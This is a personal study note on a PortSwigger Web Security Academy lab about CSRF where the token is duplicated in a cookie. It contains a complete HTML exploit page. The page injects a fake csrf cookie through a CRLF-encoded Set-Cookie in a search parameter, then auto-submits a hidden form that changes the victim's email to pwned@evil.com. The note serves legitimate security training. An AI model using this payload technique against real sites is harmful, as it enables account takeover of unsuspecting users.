---
title: "Lab: CSRF where token is duplicated in cookie"
aliases:
  - "Lab CSRF where token is duplicated in cookie"
kind: lab
tags:
  - vulnerabilities
  - lab
area: "Vulnerabilities"
up: "[[CSRF]]"
notion-id: 50f759b927518229bcc08148541abcaa
---

# Lab: CSRF where token is duplicated in cookie

In: [[Career]] / [[Vulnerabilities]] / [[CSRF]]

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

![[attachments/Vulnerabilities/CSRF/Lab - CSRF where token is duplicated in cookie/image.png]]

![[attachments/Vulnerabilities/CSRF/Lab - CSRF where token is duplicated in cookie/image 1.png]]

![[attachments/Vulnerabilities/CSRF/Lab - CSRF where token is duplicated in cookie/image 2.png]]

```html
<html>
  <body>
    <!-- Form to change victim's email -->
    <form action="https://0ac000ba03ecb0c78196616b003c0011.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil.com" />
      <input type="hidden" name="csrf" value="fake" />
    </form>

    <!-- Inject fake csrf cookie + auto-submit on error/load -->
    <img src="https://0ac000ba03ecb0c78196616b003c0011.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake;%20SameSite=None"
         onerror="document.forms[0].submit()" />
  </body>
</html>
```
